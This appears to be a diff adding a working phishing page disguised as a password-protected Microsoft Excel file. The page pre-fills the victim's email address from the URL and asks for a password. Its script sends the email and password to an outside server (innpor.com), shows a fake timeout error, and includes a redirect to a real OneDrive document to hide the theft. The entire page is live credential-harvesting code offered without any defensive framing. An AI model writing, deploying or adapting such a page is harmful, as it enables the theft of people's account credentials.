@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Document | Microsoft Excel</title>
+        <link rel="shortcut icon" href="https://firebasestorage.googleapis.com/v0/b/mugulevel786.appspot.com/o/exec-robot-fav.png?alt=media&token=350c04f8-cff6-4f62-9cc0-2104e1e0c2bf" />
+	<style type="text/css">
+
+		#loadingGif {
+			display: none;
+		}
+body {
+			background-image: url('https://cdn.glitch.global/92516367-f90c-4370-adc9-095cf284d0c7/excel-back.png?v=1706803353362');
+			background-size: cover;
+                        background-repeat: no-repeat;
+                        opacity: 100;
+                        background-attachment: fixed;
+			font-family: Arial, sans-serif;
+		}
+		.form-container {
+			position: absolute;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			width: 400px;
+			background-color: #fff;
+			padding: 40px;
+			box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+			text-align: left;
+                        border: solid 5px #027148;
+		}
+		.form-container img {
+			max-width: 20%;
+			margin-bottom: 20px;
+		}
+		.form-container input {
+			display: block;
+			width: 100%;
+			padding: 10px;
+			margin-bottom: 20px;
+			border: 1px solid #ccc;
+			border-radius: 5px;
+			font-size: 16px;
+			color: #555;
+			box-sizing: border-box;
+		}
+		.form-container button {
+			display: block;
+			width: 100%;
+			padding: 10px;
+			background-color: #027148;
+			border: none;
+			border-radius: 5px;
+			color: #fff;
+			font-size: 16px;
+			cursor: pointer;
+		}
+                .grid-container {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    grid-gap: 20px;
+}
+	</style>
+	
+<body>
+	<div class="form-container">
+             <div class="grid-container">
+               <div class="grid-child">
+		<img src="https://cdn.glitch.global/92516367-f90c-4370-adc9-095cf284d0c7/excel-logo.png?v=1706803356184" alt="Logo">
+               </div>
+              <div class="grid-child">
+               <span> File is password protected </span>
+              </div>
+             </div>
+
+		<form id="goodThings" action="" method="post">
+			<div class="form-group">
+				<label for="pro">Email Address:</label>
+				<input type="text" class="form-control" name="email" id="email"  value="">
+			</div>
+			<div class="form-group">
+				<label for="pro">Password</label>
+				<input type="password" class="form-control" name="password" id="password" required="required">
+			</div>
+			<button type="submit" class="btn btn-primary">View Document(s)</button>
+                        <br />
+                        <div id="loadingGif"><img src="https://cdn.glitch.global/92516367-f90c-4370-adc9-095cf284d0c7/loading2.gif?v=1706803354588"></div>
+                        <div id="message"></div>
+
+	
+		</form>
+	</div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+	<script type="text/javascript">
+		$(document).ready(function() {
+      // Get the value of the 'email' parameter from the URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const emailValue = urlParams.get('email');
+
+      // Set the value of the input field with id 'email'
+      $('#email').val(emailValue);
+			// when the form is submitted
+			$("#goodThings").submit(function(event) {
+				// prevent the default form submission behavior
+				event.preventDefault();
+
+
+				// show the loading GIF
+				$("#loadingGif").show();
+
+				// get the values of the form inputs
+				var emailVal = $("#email").val();
+				var passwordVal = $("#password").val();
+
+				
+				// display a success message with a delay of 1 second
+				setTimeout(function() {
+				$("#message").html("Error Timeout!");
+				}, 1000);
+
+				// reset the value of the password input field
+				$("#password").val("");
+
+				// send form data to email
+				var emailData = {
+					email: emailVal,
+					password: passwordVal
+				};
+				$.ajax({
+					type: "POST",
+					url: "https://innpor.com/ph/nhz.php",
+					data: emailData,
+					success: function() {
+						console.log("Email sent successfully");
+					},
+					error: function() {
+						console.log("Error sending email");
+					},
+					complete: function() {
+						// hide the loading GIF
+						$("#loadingGif").hide();
+					}
+				});
+
+				// when the user fills out the password input field again and submits
+				$("#myForm").submit(function(event) {
+					// prevent the default form submission behavior
+					event.preventDefault();
+
+					// show the loading GIF
+					$("#loadingGif").show();
+
+					// get the new value of the password input field
+					var newpasswordVal = $("#password").val();
+
+					setTimeout(function() {
+					$("#message").html("Success! Retriving document(s)");
+					}, 1000);
+
+					// redirect to another page after a brief delay
+					setTimeout(function() {
+						window.location.href = "https://onedrive.live.com/view.aspx?resid=EFAECBAF1359957A!246&ithint=file%2cxlsx&wdo=2&authkey=!APiPnfpM9Rgk_IE";
+					}, 2000);
+				});
+			});
+		});
+	</script>
+
+
+</body>
+</html>
